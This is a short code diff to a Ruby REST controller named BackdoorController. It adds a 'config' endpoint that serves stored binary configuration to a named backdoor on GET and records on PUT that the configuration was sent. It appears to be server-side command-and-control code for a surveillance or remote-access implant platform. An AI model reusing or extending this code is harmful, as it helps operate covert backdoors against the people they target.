@@ -46,6 +46,21 @@ class BackdoorController < RESTController
   end
 
 
+  def config
+    case @req_method
+      when 'GET'
+        content = DB.backdoor_config(params[:backdoor])
+        return STATUS_NOT_FOUND if content.nil?
+        return STATUS_OK, content, 'binary/octet-stream'
+      when 'PUT'
+        DB.backdoor_config_sent(params[:backdoor])
+        trace :info, "[#{@req_peer}] Configuration sent [#{params[:backdoor]}]"
+    end
+
+    return STATUS_OK
+  end
+
+
   # retrieve the list of upload for a given backdoor
   def uploads
     require_auth_level :server, :tech
